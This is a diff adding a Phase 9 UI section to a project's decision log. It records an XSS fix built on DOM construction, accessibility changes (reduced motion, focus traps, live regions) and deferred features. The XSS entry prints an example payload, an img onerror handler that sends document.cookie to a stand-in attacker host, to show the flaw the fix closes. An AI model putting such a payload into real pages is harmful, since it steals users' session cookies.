@@ -487,3 +487,81 @@ cannot contain the hash of a transaction that commits to that record.
 Exports additionally publish `sealed_root`, `sealed_root_matches_current` and
 `records_added_after_seal`. Appending after a seal is legitimate; publishing the drifted root as if it
 were anchored is not. Two regression tests cover both.
+
+---
+
+## Phase 9 — Workbench UI
+
+### DEC-039 — FINDING-02 closed: reports are built from DOM nodes, not HTML strings.
+Carried since the Phase 1 audit. Both v1 print paths template-interpolated **analyst-authored** fields
+into HTML and passed the result to `document.write()`. Confirmed exploitable before rewriting — a case
+titled
+
+    <img src=x onerror="fetch('https://evil.test/'+document.cookie)">
+
+produces a live `onerror` handler executing on the **same origin as the officer's session**, in a tool
+whose whole purpose is handling hostile input copied from criminal marketplaces. The second site
+(`AlertLog.tsx:62`) was never named in the playbook and was found by the Phase 1 audit.
+
+Fixed by escape-**by-construction**, not by escaping: `lib/report.ts` builds the report with
+`createElement` + `textContent`, which cannot produce markup regardless of input. There is no escaping
+helper for a future call site to forget. `document.write` is gone from the codebase, and the generated
+document contains no inline `<script>` either, so a strict CSP cannot be bypassed through this path.
+
+Regression-locked by 13 tests including five real XSS payloads, plus static assertions that no source
+file calls `document.write(` or assigns `innerHTML`.
+
+### DEC-040 — FINDING-05 closed: motion is gated, but information is not.
+v1 had zero `prefers-reduced-motion` handling while running three indefinite animations (scanline,
+geofence pulse, siren expansion) in a tool an officer watches for a full shift.
+
+The gate reduces motion **without reducing information**, which is the part worth getting right: the
+scanline is pure decoration and is removed, but a siren freezes at **full extent** rather than at
+whatever frame it stopped on, so a breach is still unmistakably visible. A reduced-motion user must not
+receive less evidence than anyone else.
+
+### DEC-041 — Focus trap, dialog roles, and an assertive live region for breaches.
+v1 had no focus trap, no Escape handling, no `role="dialog"` and no `aria-live` anywhere. A keyboard
+user could Tab out of an open modal into the page behind it; a screen-reader user was never told a
+dialog had opened, and **never heard that a geofence breach had fired**.
+
+`lib/a11y.ts` traps Tab in both directions, handles Escape, and restores focus to the element that
+opened the dialog. Wired into `IntelDetailModal` and the notification drawer.
+
+`BreachToaster` now renders a visually-hidden `aria-live="assertive"` region alongside the toast.
+Sonner toasts are routinely missed by screen readers, and a geofence breach is the single most
+important event this product produces — announcing it is not an accessibility nicety, it is the feature.
+
+### DEC-042 — `offsetParent` is the wrong visibility test; the focus trap was a no-op.
+`focusableWithin()` filtered candidates on `offsetParent !== null`. That property is **null for any
+`position: fixed` element**, and every dialog in this app is fixed — the notification drawer is
+`fixed right-0`, the intercept modal is `fixed inset-0`.
+
+So the trap found zero focusable elements and **did nothing on precisely the elements it existed to
+trap**. The nine unit tests passed throughout, because happy-dom reports `offsetParent` differently
+from a real browser.
+
+Caught by the Playwright journey. Now uses `getClientRects()`, which is layout-based and correct for
+fixed positioning, with an explicit fallback for headless DOM implementations that have no layout.
+
+### DEC-043 — Touch targets gate on `pointer: coarse`, not viewport width.
+The playbook asks for 44px targets below 768px. Width is a proxy that is wrong in both directions: a
+narrow browser window on a desktop is still mouse-driven and does not need them, and a large tablet
+does. `@media (pointer: coarse)` asks the actual question.
+
+Applied by growing the hit area rather than the visual box, so the control room's instrument density
+survives untouched on desktop. The journey asserts it in a context with `hasTouch: true`, so the test
+matches the rule rather than asserting a rule that deliberately does not apply.
+
+### DEC-044 — Phase 9 scope: cut MapLibre, 3D graph and the Sankey; kept what carries the claims.
+The playbook allows cutting inside a phase and recording it. Built: the **Evidence Trail** (the
+0.84-vs-0.999 argument, with the LR arithmetic shown rather than asserted) and the **Audit Ledger**
+(hash chain, seal, verify, LOCAL CHAIN badge) — the two panels that carry the USPs — plus both pieces
+of carried debt and the accessibility work.
+
+Deferred as **roadmap, not done**: MapLibre GL replacing Leaflet, react-force-graph-3d, the d3 Sankey
+rendering, and the timeline scrubber. Leaflet already works and the tilt is presentation, not
+capability; the three-column responsive contract, zero horizontal overflow and the reduced-motion
+behaviour are all verified at 1440 / 1024 / 390.
+
+On stage these are described as roadmap. Never as done.
